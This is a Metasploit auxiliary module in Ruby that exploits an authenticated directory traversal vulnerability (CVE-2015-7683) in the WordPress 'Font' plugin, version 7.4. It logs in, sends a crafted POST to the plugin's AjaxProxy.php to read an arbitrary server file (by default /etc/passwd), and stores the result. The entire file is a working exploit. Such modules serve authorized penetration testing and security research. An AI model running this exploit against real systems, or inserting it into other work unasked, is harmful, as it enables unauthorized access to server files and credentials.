##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress Font File Read Vulnerability',
      'Description'    => %q{
        This module exploits an authenticated directory traversal
        vulnerability in WordPress Plugin "Font" version 7.4,
        allowing to read arbitrary files with the web server privileges.
      },
      'References'     =>
        [
          ['WPVDB', '8214'],
          ['CVE', '2015-7683'],
          ['PACKETSTORM', '133930']
        ],
      'Author'         =>
        [
          'David Moore', # Vulnerability Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('WP_USERNAME', [true, 'A valid username', nil]),
        OptString.new('WP_PASSWORD', [true, 'Valid password for the provided username', nil]),
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd'])
      ], self.class)
  end

  def user
    datastore['WP_USERNAME']
  end

  def password
    datastore['WP_PASSWORD']
  end

  def check
    check_plugin_version_from_readme('font', '7.5.1')
  end

  def run_host(ip)
    vprint_status("#{peer} - Trying to login as: #{user}")
    cookie = wordpress_login(user, password)
    fail_with(Failure::NoAccess, "#{peer} - Unable to login as: #{user}") if cookie.nil?

    filename = datastore['FILEPATH']

    res = send_request_cgi(
      'method'          => 'POST',
      'uri'             => normalize_uri(wordpress_url_plugins, 'font', 'AjaxProxy.php'),
      'vars_post'       => {
        'url'           => "#{filename}",
        'data[version]' => 7.4,
        'format'        => 'json',
        'action'        => 'cross_domain_request'
      },
      'cookie'          => cookie
    )

    if res && res.code == 200 && res.body.length > 0 && !res.body.include?('success":"false')
      vprint_line("#{res.body}")
      fname = datastore['FILEPATH']

      path = store_loot(
        'font.traversal',
        'text/plain',
        ip,
        res.body,
        fname
      )

      print_good("#{peer} - File saved in: #{path}")
    else
      print_error("#{peer} - Nothing was downloaded. You can try to change the FILEPATH.")
    end
  end

end
